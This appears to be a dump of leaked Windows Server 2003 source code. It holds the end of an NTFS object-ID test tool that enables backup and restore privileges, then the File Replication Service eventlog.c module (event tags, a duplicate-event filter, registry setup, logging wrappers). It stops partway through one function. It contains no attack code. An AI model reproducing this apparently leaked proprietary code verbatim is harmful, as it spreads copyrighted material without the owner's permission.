        FsTestObOidHelp( argv[0] );
    }

    Drive = *argv[1];
    FsTestOpenByOid( (PUCHAR) ObjectId, Length, &Drive );

    return;
}
#endif




VOID
_cdecl
main(
    int argc,
    char *argv[]
    )
{
    HANDLE File;
    FILE_OBJECTID_BUFFER ObjectIdBuffer;
    IO_STATUS_BLOCK IoStatusBlock;
    NTSTATUS Status;
    OBJECT_ATTRIBUTES ObjAttr;
    ANSI_STRING AnsiName;
    UNICODE_STRING UnicodeName;
    char DriveNameBuffer[3200];

    //
    //  Get parameters.
    //

    if (argc < 3) {

        printf("This program sets an object id for a file (ntfs only).\n\n");
        printf("usage: %s filename ObjectId \n", argv[0]);
        printf("  object ID is a string of the form b81b486b-c338-11d0-ba4f0000f80007df\n"
               "  See the struct def for GUID in sdk\\inc\\winnt.h for byte layout.\n\n"
               "  The filename must contain the complete path including drive letter.\n"
               "  e.g.  D:\\test\\foo\\bar.txt\n");
        return;
    }

    AnsiName.Length = (USHORT) strlen(argv[1]);
    AnsiName.Buffer = argv[1];

    Status = RtlAnsiStringToUnicodeString( &UnicodeName, &AnsiName, TRUE );

    if (!NT_SUCCESS(Status)) {
        printf( "Error initalizing strings" );
        return;
    }

    Status = SetupOnePrivilege(SE_BACKUP_PRIVILEGE, "Backup");
    if (!NT_SUCCESS(Status)) {
        printf( "ERROR - Failed to get Backup privilege. 0x%08x\n", Status);
        return ;
    }

    //
    // Need restore priv to use FSCTL_SET_OBJECT_ID
    //
    Status = SetupOnePrivilege(SE_RESTORE_PRIVILEGE, "Restore");
    if (!NT_SUCCESS(Status)) {
        printf( "ERROR - Failed to get Restore privilege. 0x%08x\n", Status);
        return;
    }

    File = FsTestOpenRelativeToVolume(&UnicodeName.Buffer[2],
                                      &UnicodeName.Buffer[0],
                                      &UnicodeName.Buffer[0]);

    RtlZeroBytes( &ObjectIdBuffer, sizeof( ObjectIdBuffer ) );


    StrToGuid( argv[2], (GUID *)&ObjectIdBuffer );

    printf( "\nUsing file:%s, ObjectId:%s\n", argv[1], argv[2]);

    FsTestDeleteOid( File );

    FsTestSetOid( File, ObjectIdBuffer );

    CloseHandle( File );

    return;
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\util\eventlog.c ===
/*++

Copyright (c) 1996-1999 Microsoft Corporation

Module Name:

    eventlog.c

Abstract:

    This module provides common eventlog services for the File Replication  service
    Stolen from the routine of the same name in the cluster service.

Author:

    John Vert (jvert) 9/13/1996
    RohanK  - Added Filter
    Davidor - Rewrite init using FrsRegistryKeyTable and CfgReg read/write functions.

Revision History:

--*/
#include <ntreppch.h>
#pragma  hdrstop

#include <frs.h>
#include <debug.h>

//
// Event Log Sources (NULL Terminated)
//

WORD FrsMessageIdToEventType[] = {
    EVENTLOG_SUCCESS,
    EVENTLOG_INFORMATION_TYPE,
    EVENTLOG_WARNING_TYPE,
    EVENTLOG_ERROR_TYPE
};


#define MESSAGEID_TO_EVENTTYPE(_id_) (FrsMessageIdToEventType[_id_ >> 30])


BOOL  EventLogRunning = FALSE;

BOOL
DebTryLock(
    VOID
    );


typedef struct _FRS_EL_ENTRY{
  DWORD     EventId;
  PCHAR     EventTag;
} FRS_EL_ENTRY, *PFRS_EL_ENTRY;

FRS_EL_ENTRY FrsEvents[] = {
    {EVENT_FRS_ERROR,                        "EVENT_FRS_ERROR"},
    {EVENT_FRS_STARTING,                     "EVENT_FRS_STARTING"},
    {EVENT_FRS_STOPPING,                     "EVENT_FRS_STOPPING"},
    {EVENT_FRS_STOPPED,                      "EVENT_FRS_STOPPED"},
    {EVENT_FRS_STOPPED_FORCE,                "EVENT_FRS_STOPPED_FORCE"},
    {EVENT_FRS_STOPPED_ASSERT,               "EVENT_FRS_STOPPED_ASSERT"},
    {EVENT_FRS_ASSERT,                       "EVENT_FRS_ASSERT"},
    {EVENT_FRS_VOLUME_NOT_SUPPORTED,         "EVENT_FRS_VOLUME_NOT_SUPPORTED"},
    {EVENT_FRS_LONG_JOIN,                    "EVENT_FRS_LONG_JOIN"},
    {EVENT_FRS_LONG_JOIN_DONE,               "EVENT_FRS_LONG_JOIN_DONE"},
    {EVENT_FRS_CANNOT_COMMUNICATE,           "EVENT_FRS_CANNOT_COMMUNICATE"},
    {EVENT_FRS_DATABASE_SPACE,               "EVENT_FRS_DATABASE_SPACE"},
    {EVENT_FRS_DISK_WRITE_CACHE_ENABLED,     "EVENT_FRS_DISK_WRITE_CACHE_ENABLED"},
    {EVENT_FRS_JET_1414,                     "EVENT_FRS_JET_1414"},
    {EVENT_FRS_SYSVOL_NOT_READY,             "EVENT_FRS_SYSVOL_NOT_READY"},
    {EVENT_FRS_SYSVOL_NOT_READY_PRIMARY,     "EVENT_FRS_SYSVOL_NOT_READY_PRIMARY"},
    {EVENT_FRS_SYSVOL_READY,                 "EVENT_FRS_SYSVOL_READY"},
    {EVENT_FRS_ACCESS_CHECKS_DISABLED,       "EVENT_FRS_ACCESS_CHECKS_DISABLED"},
    {EVENT_FRS_ACCESS_CHECKS_FAILED_USER,    "EVENT_FRS_ACCESS_CHECKS_FAILED_USER"},
    {EVENT_FRS_ACCESS_CHECKS_FAILED_UNKNOWN, "EVENT_FRS_ACCESS_CHECKS_FAILED_UNKNOWN"},
    {EVENT_FRS_MOVED_PREEXISTING,            "EVENT_FRS_MOVED_PREEXISTING"},
    {EVENT_FRS_CANNOT_START_BACKUP_RESTORE_IN_PROGRESS, "EVENT_FRS_CANNOT_START_BACKUP_RESTORE_IN_PROGRESS"},
    {EVENT_FRS_STAGING_AREA_FULL,            "EVENT_FRS_STAGING_AREA_FULL"},
    {EVENT_FRS_HUGE_FILE,                    "EVENT_FRS_HUGE_FILE"},
    {EVENT_FRS_CANNOT_CREATE_UUID,           "EVENT_FRS_CANNOT_CREATE_UUID"},
    {EVENT_FRS_NO_DNS_ATTRIBUTE,             "EVENT_FRS_NO_DNS_ATTRIBUTE"},
    {EVENT_FRS_NO_SID,                       "EVENT_FRS_NO_SID"},
    {NTFRSPRF_OPEN_RPC_BINDING_ERROR_SET,    "NTFRSPRF_OPEN_RPC_BINDING_ERROR_SET"},
    {NTFRSPRF_OPEN_RPC_BINDING_ERROR_CONN,   "NTFRSPRF_OPEN_RPC_BINDING_ERROR_CONN"},
    {NTFRSPRF_OPEN_RPC_CALL_ERROR_SET,       "NTFRSPRF_OPEN_RPC_CALL_ERROR_SET"},
    {NTFRSPRF_OPEN_RPC_CALL_ERROR_CONN,      "NTFRSPRF_OPEN_RPC_CALL_ERROR_CONN"},
    {NTFRSPRF_COLLECT_RPC_BINDING_ERROR_SET, "NTFRSPRF_COLLECT_RPC_BINDING_ERROR_SET"},
    {NTFRSPRF_COLLECT_RPC_BINDING_ERROR_CONN,"NTFRSPRF_COLLECT_RPC_BINDING_ERROR_CONN"},
    {NTFRSPRF_COLLECT_RPC_CALL_ERROR_SET,    "NTFRSPRF_COLLECT_RPC_CALL_ERROR_SET"},
    {NTFRSPRF_COLLECT_RPC_CALL_ERROR_CONN,   "NTFRSPRF_COLLECT_RPC_CALL_ERROR_CONN"},
    {NTFRSPRF_VIRTUALALLOC_ERROR_SET,        "NTFRSPRF_VIRTUALALLOC_ERROR_SET"},
    {NTFRSPRF_VIRTUALALLOC_ERROR_CONN,       "NTFRSPRF_VIRTUALALLOC_ERROR_CONN"},
    {NTFRSPRF_REGISTRY_ERROR_SET,            "NTFRSPRF_REGISTRY_ERROR_SET"},
    {NTFRSPRF_REGISTRY_ERROR_CONN,           "NTFRSPRF_REGISTRY_ERROR_CONN"},
    {EVENT_FRS_ROOT_NOT_VALID,               "EVENT_FRS_ROOT_NOT_VALID"},
    {EVENT_FRS_STAGE_NOT_VALID,              "EVENT_FRS_STAGE_NOT_VALID"},
    {EVENT_FRS_OVERLAPS_LOGGING,             "EVENT_FRS_OVERLAPS_LOGGING"},
    {EVENT_FRS_OVERLAPS_WORKING,             "EVENT_FRS_OVERLAPS_WORKING"},
    {EVENT_FRS_OVERLAPS_STAGE,               "EVENT_FRS_OVERLAPS_STAGE"},
    {EVENT_FRS_OVERLAPS_ROOT,                "EVENT_FRS_OVERLAPS_ROOT"},
    {EVENT_FRS_OVERLAPS_OTHER_STAGE,         "EVENT_FRS_OVERLAPS_OTHER_STAGE"},
    {EVENT_FRS_PREPARE_ROOT_FAILED,          "EVENT_FRS_PREPARE_ROOT_FAILED"},
    {EVENT_FRS_BAD_REG_DATA,                 "EVENT_FRS_BAD_REG_DATA"},
    {EVENT_FRS_JOIN_FAIL_TIME_SKEW,          "EVENT_FRS_JOIN_FAIL_TIME_SKEW"},
    {EVENT_FRS_RMTCO_TIME_SKEW,              "EVENT_FRS_RMTCO_TIME_SKEW"},
    {EVENT_FRS_CANT_OPEN_STAGE,              "EVENT_FRS_CANT_OPEN_STAGE"},
    {EVENT_FRS_CANT_OPEN_PREINSTALL,         "EVENT_FRS_CANT_OPEN_PREINSTALL"},
    {EVENT_FRS_REPLICA_SET_CREATE_FAIL,      "EVENT_FRS_REPLICA_SET_CREATE_FAIL"},
    {EVENT_FRS_REPLICA_SET_CREATE_OK,        "EVENT_FRS_REPLICA_SET_CREATE_OK"},
    {EVENT_FRS_REPLICA_SET_CXTIONS,          "EVENT_FRS_REPLICA_SET_CXTIONS"},
    {EVENT_FRS_IN_ERROR_STATE,               "EVENT_FRS_IN_ERROR_STATE"},
    {EVENT_FRS_REPLICA_NO_ROOT_CHANGE,       "EVENT_FRS_REPLICA_NO_ROOT_CHANGE"},
    {EVENT_FRS_DUPLICATE_IN_CXTION_SYSVOL,   "EVENT_FRS_DUPLICATE_IN_CXTION_SYSVOL"},
    {EVENT_FRS_DUPLICATE_IN_CXTION,          "EVENT_FRS_DUPLICATE_IN_CXTION"},
    {EVENT_FRS_ROOT_HAS_MOVED,               "EVENT_FRS_ROOT_HAS_MOVED"},
    {EVENT_FRS_ERROR_REPLICA_SET_DELETED,    "EVENT_FRS_ERROR_REPLICA_SET_DELETED"},
    {EVENT_FRS_REPLICA_IN_JRNL_WRAP_ERROR,   "EVENT_FRS_REPLICA_IN_JRNL_WRAP_ERROR"},
    {EVENT_FRS_DS_POLL_ERROR_SUMMARY,        "EVENT_FRS_DS_POLL_ERROR_SUMMARY"},
    {EVENT_FRS_STAGE_HAS_CHANGED,            "EVENT_FRS_STAGE_HAS_CHANGED"},
    {EVENT_FRS_LOG_SPACE,                    "EVENT_FRS_LOG_SPACE"},

    {EVENT_FRS_SYSVOL_NOT_READY_2,           "EVENT_FRS_SYSVOL_NOT_READY_2"},
    {EVENT_FRS_SYSVOL_NOT_READY_PRIMARY_2,   "EVENT_FRS_SYSVOL_NOT_READY_PRIMARY_2"},
    {EVENT_FRS_FILE_UPDATES_SUPPRESSED,      "EVENT_FRS_FILE_UPDATES_SUPPRESSED"},
    {EVENT_FRS_REPLICA_IN_JRNL_WRAP_NO_AUTO_RESTORE, "EVENT_FRS_REPLICA_IN_JRNL_WRAP_NO_AUTO_RESTORE"},
    {EVENT_FRS_FILES_SKIPPED_DURING_PRIMARY_LOAD, "EVENT_FRS_FILES_SKIPPED_DURING_PRIMARY_LOAD"},

    {0     , "Event tag not found"}
};


PCHAR FrsEventIdToTag (
    DWORD ID
)
{
    DWORD j = 0;

    while ((FrsEvents[j].EventId != ID) && (FrsEvents[j].EventId != 0)) {j++;}

    return FrsEvents[j].EventTag;
}



DWORD
ELHashFunction (
    IN PVOID Qkey,
    IN ULONG len
    )

/*++

Routine Description:

    This is the hashing function used by the functions that Lookup,
    Add or Delete entries from the Hash Tables. The Key is a 64 bit
    number and the hashing function casts it to a 32 bit number and
    returns it as the hash value.

Arguments:

    QKey - Pointer to the Key to be hashed.
    len - Length of QKey (unused here).

Return Value:

    The hashed value of the Key.

--*/

{
#undef DEBSUB
#define DEBSUB "ELHashFunction:"

    ULONG key;    // hashed key value to be returned
    PULONGLONG p; // hash the key to PULONGLONG

    FRS_ASSERT(Qkey != NULL);
    p = (PULONGLONG)Qkey;
    key = (ULONG)*p;
    return (key);
}



BOOL
FrsEventLogFilter(
    IN DWORD    EventMessageId,
    IN PWCHAR   *ArrOfPtrToArgs,
    IN DWORD    NumOfArgs
    )
/*++

Routine Description:

    This function is used to filter out eventlogs messages
    which have been already written to the EventLog in the
    last EVENTLOG_FILTER_TIME sec.
    This is done so that the eventlog does not get filled
    up with noisy similar messages.

    WARNING -- this function may be called from inside of DPRINTs. So
               do not call DPRINT (or any function referenced by
               DPRINT) from this function.
               DPRINTS below are left for testing but normally are commented out.

Arguments:

    EventMessageId      -   Supplies the message ID to be logged.
    ArrOfPtrToArgs      -   Array of pointers to Arguments passed
                            in to the FrsEventLogx functions.
    NumOfArgs           -   The number of elements in the above
                            array

Return Value:

    TRUE          -   Print the entry in the eventlog
    FALSE         -   Do not print the entry

--*/

{
#undef DEBSUB
#define DEBSUB "FrsEventLogFilter:"

    DWORD i, j, sc = 0; // sc = shiftcount while calc the hash value
    ULONGLONG QKey = 0; // The hash key value
    ULONGLONG QVal = 0;
    DWORD GStatus;
    ULONGLONG Data;
    ULONG_PTR Flags;
    FILETIME CurrentTime;
    LARGE_INTEGER CT;
    LONGLONG TimeDiff = 0;

    //DPRINT2(5, "ELOG:Filter Request came in with %08x args and an ID value of %08x\n",
    //        NumOfArgs, EventMessageId);

    //
    // Quit if event log not yet initialized.
    //
    if (!EventLogRunning) {
        return FALSE;
    }

    //
    // Calculate the hash key using the arguments that came in.
    // Assign the Id value to the QKey to start with.
    //
    QKey = EventMessageId;
    //
    // To calculate the value of QKey, every character of every argument
    // is taken, cast to a ULONGLONG left shifted by (0, 4, 8....60) and then
    // added to the value of QKey
    //
    for (i = 0; i < NumOfArgs; i++) {
        if (ArrOfPtrToArgs[i]) {
            for (j = 0; ArrOfPtrToArgs[i][j] != L'\0'; j++) {

                QVal = (ULONGLONG)ArrOfPtrToArgs[i][j];
                QVal = QVal << sc;
                sc += 4;

                if (sc >= 60) {
                    sc = 0;
                }

                QKey += QVal;
            }
        }
    }

    //
    // QKey should never be zero
    //
    if (QKey == 0) {
        QKey = EventMessageId;
    }

    //
    // Lookup this entry in the table.  If it exists, get the time associated
    // with this entry.  If the difference between the current time and the
    // time associated with the entry is greater than EVENTLOG_FILTER_TIME
    // sec, update the entry and return TRUE, otherwise return FALSE If the
    // entry for this key does not exist in the hash table, then this is the
    // first time this key is being written to the eventlog.  In this case,
    // add the entry to the hash table, associate the current time with it and
    // return TRUE
    //
    GStatus = QHashLookup(HTEventLogTimes, &(QKey), &Data, &Flags);
    if (GStatus == GHT_STATUS_SUCCESS) {
        //
        // Key exists, now compare the time values
        //
        GetSystemTimeAsFileTime(&CurrentTime);
        CT.LowPart = CurrentTime.dwLowDateTime;
        CT.HighPart = CurrentTime.dwHighDateTime;
        TimeDiff = ((((LONGLONG)CT.QuadPart) / (LONGLONG)CONVERTTOSEC) - (LONGLONG)Data);

        //DPRINT1(5, "ELOG:The value of TimeDiff is %08x %08x\n", PRINTQUAD(TimeDiff));

        if (TimeDiff > EVENTLOG_FILTER_TIME) {
            //
            // UpDate the hash table entry. GetSystemTimeAsFileTime
            // retuns the time in 100 nano (100 * 10^9) sec units. Hence
            // to get it in sec we need to divide by (10^7)
            //
            Data = (((ULONGLONG)CT.QuadPart) / (ULONGLONG)CONVERTTOSEC);
            GStatus = QHashUpdate(HTEventLogTimes, &(QKey), &Data, Flags);
            if (GStatus == GHT_STATUS_FAILURE) {
                //DPRINT2(5, "ELOG:QHashUpdate failed while updating ID %08x with QKey %08x %08x\n",
                //   EventMessageId, PRINTQUAD(QKey));
            } else {
                //DPRINT2(5, "ELOG:Update was successful for eventlog entry with ID %08x and QKey %08x %08x\n",
                //        EventMessageId, PRINTQUAD(QKey));
            }
            return TRUE;
        }
        else {
            //
            // This event log entry should not be written
            //
            //DPRINT2(5, "ELOG: Did not add the ID %08x with QKey %08x %08x to the EventLog\n",
            //        EventMessageId, PRINTQUAD(QKey));
            return FALSE;
        }

    } else {
        //
        // Key does not exist
        // Create a new entry for it
        //
        //DPRINT2(5, "ELOG:Got a new eventlog entry with ID %08x and QKey %08x %08x\n",
        //        EventMessageId, PRINTQUAD(QKey));
        //
        // Get the current system time
        //
        GetSystemTimeAsFileTime(&CurrentTime);
        CT.LowPart = CurrentTime.dwLowDateTime;
        CT.HighPart = CurrentTime.dwHighDateTime;
        //
        // GetSystemTimeAsFileTime retuns the time in 100 nano
        // (100 * 10^9) sec units. Hence to get it in sec we need to
        // divide by (10^7)
        //
        Data = (((ULONGLONG)CT.QuadPart) / (ULONGLONG)CONVERTTOSEC);
        //
        // Insert the new entry into the hash table
        //
        GStatus = QHashInsert(HTEventLogTimes, &QKey, &Data, 0, FALSE);
        if (GStatus == GHT_STATUS_FAILURE) {
            //DPRINT2(5, "ELOG:QHashInsert failed while Inserting ID %08x with QKey %08x %08x\n",
            //       EventMessageId, PRINTQUAD(QKey));
        } else {
            //DPRINT2(5, "ELOG:Insert was successful for eventlog entry with ID %08x and QKey %08x %08x\n",
            //        EventMessageId, PRINTQUAD(QKey));
        }
        return TRUE;
    }
}



VOID
InitializeEventLog(
    VOID
    )
/*++

Routine Description:

    Create the event log entry and setup the event log handle.

Arguments:

    None.

Return Value:

    None.

--*/

{
#undef DEBSUB
#define DEBSUB "InitializeEventLog:"

    DWORD   WStatus;
    PWCHAR  Path = NULL;
    HANDLE  hEventLog;
    HKEY    EventLogKey    = INVALID_HANDLE_VALUE;
    HKEY    FrsEventLogKey = INVALID_HANDLE_VALUE;
    HKEY    FrsSourceKey   = INVALID_HANDLE_VALUE;

    //
    // create the hash table and assign the hash function.  The table
    // is used for storing eventlog times of similar messages. These
    // values of time are used in filtering these similar messages
    //
    HTEventLogTimes = FrsAllocTypeSize(QHASH_TABLE_TYPE, ELHASHTABLESIZE);
    SET_QHASH_TABLE_HASH_CALC(HTEventLogTimes, ELHashFunction);

    //
    // EventLog Key   -  <SERVICE_ROOT>\EventLog
    //
    WStatus = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                           EVENTLOG_ROOT,
                           0,
                           KEY_ALL_ACCESS,
                           &EventLogKey);
    CLEANUP1_WS(0, "WARN - Cannot open %ws;", EVENTLOG_ROOT, WStatus, CLEANUP);

    //
    // Set new eventlog source in the registry
    //
    WStatus = RegCreateKey(EventLogKey, SERVICE_LONG_NAME, &FrsEventLogKey);
    CLEANUP1_WS(0, "WARN - Cannot create %ws;", FRS_EVENTLOG_SECTION, WStatus, CLEANUP);

    //
    // Add the following values to the Reg key HKLM.....\EventLog\File Replication Service
    // 1. File 2. Retention 3. MaxSize
    //
    // If the values already exist then preserve them.
    //

    //
    // Event log file name  -- "%SystemRoot%\system32\config\NtFrs.Evt"
    //
    CfgRegWriteString(FKC_EVENTLOG_FILE,
                     SERVICE_LONG_NAME,
                     FRS_RKF_FORCE_DEFAULT_VALUE | FRS_RKF_KEEP_EXISTING_VALUE,
                     0);
    //
    // Retention
    //
    CfgRegWriteDWord(FKC_EVENTLOG_RETENTION,
                     SERVICE_LONG_NAME,
                     FRS_RKF_FORCE_DEFAULT_VALUE | FRS_RKF_KEEP_EXISTING_VALUE,
                     0);
    //
    // MaxSize
    //
    CfgRegWriteDWord(FKC_EVENTLOG_MAXSIZE,
                     SERVICE_LONG_NAME,
                     FRS_RKF_FORCE_DEFAULT_VALUE | FRS_RKF_KEEP_EXISTING_VALUE,
                     0);

    //
    // DisplayNameID
    //
    CfgRegWriteDWord(FKC_EVENTLOG_DISPLAY_NAMEID,
                     SERVICE_LONG_NAME,
                     FRS_RKF_FORCE_DEFAULT_VALUE | FRS_RKF_KEEP_EXISTING_VALUE,
                     0);

    //
    // DisplayNameFile
    //
    CfgRegWriteString(FKC_EVENTLOG_DISPLAY_FILENAME,
                      SERVICE_LONG_NAME,
                      FRS_RKF_FORCE_DEFAULT_VALUE | FRS_RKF_KEEP_EXISTING_VALUE,
                      NULL);

    //
    // CustomSD : used to make FRS eventlogs secure.
    //
    CfgRegWriteString(FKC_EVENTLOG_CUSTOM_SD,
                      SERVICE_LONG_NAME,
                      FRS_RKF_FORCE_DEFAULT_VALUE | FRS_RKF_KEEP_EXISTING_VALUE,
                      NULL);

    //
    // Event Message File
    //
    WStatus = RegSetValueEx(FrsEventLogKey,
                            L"Sources",
                            0,
                            REG_MULTI_SZ,
                            (PCHAR)(SERVICE_NAME L"\0"
                                    SERVICE_LONG_NAME L"\0"),
                            (wcslen(SERVICE_NAME) +
                             wcslen(SERVICE_LONG_NAME) +
                             3) * sizeof(WCHAR));
    CLEANUP1_WS(0, "WARN - Cannot set event log value Sources for %ws;",
                SERVICE_LONG_NAME, WStatus, CLEANUP);

    //
    // Get the message file path. (expanding any environment vars).
    //
    CfgRegReadString(FKC_FRS_MESSAGE_FILE_PATH, NULL, 0, &Path);

    //
    // Add values for message file and event types for each event log source.
    //
    CfgRegWriteString(FKC_EVENTLOG_EVENT_MSG_FILE, SERVICE_NAME, 0, Path);

    CfgRegWriteString(FKC_EVENTLOG_EVENT_MSG_FILE, SERVICE_LONG_NAME, 0, Path);


    CfgRegWriteDWord(FKC_EVENTLOG_TYPES_SUPPORTED,
                     SERVICE_NAME,
                     FRS_RKF_FORCE_DEFAULT_VALUE,
                     0);

    CfgRegWriteDWord(FKC_EVENTLOG_TYPES_SUPPORTED,
                     SERVICE_LONG_NAME,
                     FRS_RKF_FORCE_DEFAULT_VALUE,
                     0);

    //
    // Unfortunately, this call will succeed with the Application log file
    // instead of the File Replication Log file if the EventLog service has not
    // yet reacted to the change notify of the updated registry keys above.
    // Hence, the source will be re-registered for each event so that ntfrs
    // events eventually show up in the file replication service log.  The
    // register/deregister pair allows EventLog some extra time so that MAYBE
    // the first event will show up in the right log.
    //
    // The eventlog folk may someday supply an interface to see if
    // the register was kicked into Application.
    //
    hEventLog = RegisterEventSource(NULL, SERVICE_NAME);
    if (hEventLog) {
        DeregisterEventSource(hEventLog);
    }

    WStatus = ERROR_SUCCESS;
    EventLogRunning = TRUE;
    DPRINT(0, "Event Log is running\n");

CLEANUP:
    DPRINT_WS(0, "ERROR - Cannot start event logging;", WStatus);

    FRS_REG_CLOSE(EventLogKey);
    FRS_REG_CLOSE(FrsEventLogKey);
    FrsFree(Path);
}




void FrsPrintEvent(
    IN DWORD    Severity,
    IN DWORD    EventMessageId,
    IN PWCHAR  *ArgArray,
    IN DWORD    NumOfArgs
)
/*++

Routine Description:

    Print the message ID and the substitution strings to the debug logs.

Arguments:

    Severity -- Severity level of DPRINT to debug log.
    EventMessageId -- FRS event log message ID.
    ArgArray -- Array of insertion strings.
    NumOfArgs -- Num of insertion strings.

Return Value:

    None.

--*/
{
#undef DEBSUB
#define DEBSUB "FrsPrintEvent:"

    DWORD       j, EventType;
    char       *EventTypeStr;
    WCHAR       TimeBuf[MAX_PATH];
    WCHAR       DateBuf[MAX_PATH];

    TimeBuf[0] = L'\0';
    DateBuf[0] = L'\0';
    GetTimeFormat(LOCALE_SYSTEM_DEFAULT, 0, NULL, L"HH':'mm':'ss", TimeBuf, MAX_PATH);
    GetDateFormat(LOCALE_SYSTEM_DEFAULT, 0, NULL, L"ddd',' MMM dd yyyy", DateBuf, MAX_PATH);


    EventType = MESSAGEID_TO_EVENTTYPE(EventMessageId);

    if        (EventType == EVENTLOG_SUCCESS)         {EventTypeStr = "Success";
    } else if (EventType & EVENTLOG_ERROR_TYPE)       {EventTypeStr = "Error";
    } else if (EventType & EVENTLOG_WARNING_TYPE)     {EventTypeStr = "Warn";
    } else if (EventType & EVENTLOG_INFORMATION_TYPE) {EventTypeStr = "Info";
    } else if (EventType & EVENTLOG_AUDIT_SUCCESS)    {EventTypeStr = "AudSuccess";
    } else if (EventType & EVENTLOG_AUDIT_FAILURE)    {EventTypeStr = "AudFail";
    } else                                            {EventTypeStr = "Unknown";
    }

    //
    // It is possible that we are being called within a Debug print (e.g.
    // an exception handler).  If we can't get the lock then we can't print.
    //
    if (DebTryLock()) {

        try {
            DPRINT_NOLOCK5(Severity, ":E: Eventlog written for %s (%d) severity: %s  at: %ws  %ws\n",
                           FrsEventIdToTag(EventMessageId),
                           EventMessageId & 0x3FFFFFFF,
                           EventTypeStr, DateBuf, TimeBuf);

            if ((ArgArray != NULL) && (NumOfArgs > 0)) {
                DPRINT_NOLOCK(Severity, ":E: STRINGS: \n");
                for (j=0; j<NumOfArgs; j++) {
                    DPRINT_NOLOCK2(Severity, ":E:   %d : '%ws'\n", j,
                                   (ArgArray[j] != NULL) ? ArgArray[j] : L"<null>");
                }
            }

        } except (EXCEPTION_EXECUTE_HANDLER) {
              //
              // Catch any exception and drop the lock.
              //
              NOTHING;
        }
        DebUnLock();
    }
}



DWORD
FrsReportEvent(
    IN DWORD    EventMessageId,
    IN PWCHAR  *ArgArray,
    IN DWORD    NumOfArgs
)
/*++

Routine Description:

    This function is used to register the event source and post the event.

    WARNING -- this function may be called from inside of DPRINTs. So
               do not call DPRINT (or any function referenced by
               DPRINT) from this function.

Arguments:

    EventMessageId      -   Supplies the message ID to be logged.
    ArgArray            -   Array of pointers to Arguments passed
                            in to the FrsEventLogx functions.
    NumOfArgs           -   The number of elements in the above
                            array

Return Value:

    Win32 Status.

--*/

{
#undef DEBSUB
#define DEBSUB "FrsReportEvent:"

    DWORD WStatus = ERROR_SUCCESS;
    HANDLE  hEventLog;
    UINT i;
    PWCHAR ResStr;

    WORD EventType;


    hEventLog = RegisterEventSource(NULL, SERVICE_NAME);

    if (!HANDLE_IS_VALID(hEventLog)) {
        WStatus = GetLastError();

        if (!WIN_SUCCESS(WStatus)) {
            //
            // It is possible that we are being called within a Debug print (e.g.
            // an exception handler).  If we can't get the lock then we can't print.
            //
            if (DebTryLock()) {

                try {
                DPRINT_NOLOCK1(1, ":E: WARN - Cannot register event source;  WStatus: %s\n",
                               ErrLabelW32(WStatus) );
                } finally {
                    //
                    // If the above took an exception make sure we drop the lock.
                    //
                    DebUnLock();
                }
            }
        }
        return WStatus;
    }

    //
    // Check if any argument exceeds the 32K size limit. If it does then truncate it
    // and indicate that the event log message size has been exceeded.
    //
    for (i=0;i<NumOfArgs;++i) {
        if (wcslen(ArgArray[i]) > 32000/sizeof(WCHAR)) { //Each string has a limit of 32K bytes.
            ResStr = FrsGetResourceStr(IDS_EVENT_LOG_MSG_SIZE_EXCEEDED);
            wcscpy(&ArgArray[i][32000/sizeof(WCHAR) - 500], ResStr);
            FrsFree(ResStr);
        }
    }

    //
    //
    // The Event Type is is part of the message ID (upper two bits) and should
    // map to be one of the following:
    // EVENTLOG_SUCCESS             Success event
    // EVENTLOG_ERROR_TYPE          Error event
    // EVENTLOG_WARNING_TYPE        Warning event
    // EVENTLOG_INFORMATION_TYPE    Information event
    //
    EventType = MESSAGEID_TO_EVENTTYPE(EventMessageId);

    //
    // Report the event.
    //
    if (!ReportEvent(hEventLog,         // handle returned by RegisterEventSource
                     EventType,         // event type to log
                     0,                 // event category
                     EventMessageId,    // event identifier
                     NULL,              // user security identifier (optional)
                     (WORD) NumOfArgs,  // number of strings to merge with message
                     0,                 // size of binary data, in bytes
                     ArgArray,          // array of strings to merge with message
                     NULL)) {           // address of binary data
        WStatus = GetLastError();
    }


    DeregisterEventSource(hEventLog);

    if (!WIN_SUCCESS(WStatus)) {
        if (DebTryLock()) {
            try {
                DPRINT_NOLOCK3(0, ":E: Failed to report event log message. %s (%d);  WStatus: %s\n",
                               FrsEventIdToTag(EventMessageId), EventMessageId, ErrLabelW32(WStatus) );
            } finally {
                //
                // If the above took an exception make sure we drop the lock.
                //
                DebUnLock();
            }
        }
    }

    return WStatus;
}




/*++

Routine Description:

    The following functions Log an event to the event log with
    from zero to six insertion strings.

    WARNING -- these functions may be called from inside of DPRINTs. So
               do not call DPRINT (or any function referenced by
               DPRINT) from this function.

Arguments:

    EventMessageId      - Supplies the message ID to be logged.

    EventMessage1..6    - Insertion strings

Return Value:

    None.

--*/


VOID
FrsEventLog0(
    IN DWORD    EventMessageId
    )
{
#undef DEBSUB
#define DEBSUB "FrsEventLog0:"
    DWORD Severity = 4;

    //
    // Check to see if this eventlog request can be filtered.
    //
    if (FrsEventLogFilter(EventMessageId, NULL, 0)) {
        FrsReportEvent(EventMessageId, NULL, 0);
        Severity = 0;
    }
    FrsPrintEvent(Severity, EventMessageId, NULL, 0);
}





VOID
FrsEventLog1(
    IN DWORD    EventMessageId,
    IN PWCHAR   EventMessage1
    )
{
#undef DEBSUB
#define DEBSUB "FrsEventLog1:"
    DWORD Severity = 4;

    PWCHAR  ArgArray[1];


    //
    // Check to see if this eventlog request can be filtered.
    //
    ArgArray[0] = EventMessage1;
    if (FrsEventLogFilter(EventMessageId, ArgArray, 1)) {
        FrsReportEvent(EventMessageId, ArgArray, 1);
        Severity = 0;
    }
    FrsPrintEvent(Severity, EventMessageId, ArgArray, 1);
}




VOID
FrsEventLog2(
    IN DWORD    EventMessageId,
    IN PWCHAR   EventMessage1,
    IN PWCHAR   EventMessage2
    )
{
#undef DEBSUB
#define DEBSUB "FrsEventLog2:"
    DWORD Severity = 4;

    PWCHAR  ArgArray[2];

    //
    // Check to see if this eventlog request can be filtered.
    //
    ArgArray[0] = EventMessage1;
    ArgArray[1] = EventMessage2;
    if (FrsEventLogFilter(EventMessageId, ArgArray, 2)) {
        FrsReportEvent(EventMessageId, ArgArray, 2);
        Severity = 0;
    }
    FrsPrintEvent(Severity, EventMessageId, ArgArray, 2);
}




VOID
FrsEventLog3(
    IN DWORD    EventMessageId,
    IN PWCHAR   EventMessage1,
    IN PWCHAR   EventMessage2,
    IN PWCHAR   EventMessage3
    )
{
#undef DEBSUB
#define DEBSUB "FrsEventLog3:"
    DWORD Severity = 4;

    PWCHAR  ArgArray[3];

